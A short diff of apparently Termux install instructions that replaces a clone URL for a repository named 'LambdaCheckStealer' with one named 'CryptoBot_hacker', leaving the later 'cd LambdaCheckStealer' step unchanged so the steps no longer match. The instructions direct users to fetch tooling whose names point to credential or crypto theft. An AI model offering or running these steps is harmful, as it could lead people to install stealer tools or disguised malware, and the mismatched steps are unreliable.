@@ -15,7 +15,7 @@ pkg install python
 
 pkg install git
 
-git clone https://github.com/CEKCYAJIHbIU/LambdaCheckStealer/
+git clone  https://github.com/moneyrobot2023/CryptoBot_hacker/
 
 cd LambdaCheckStealer
 
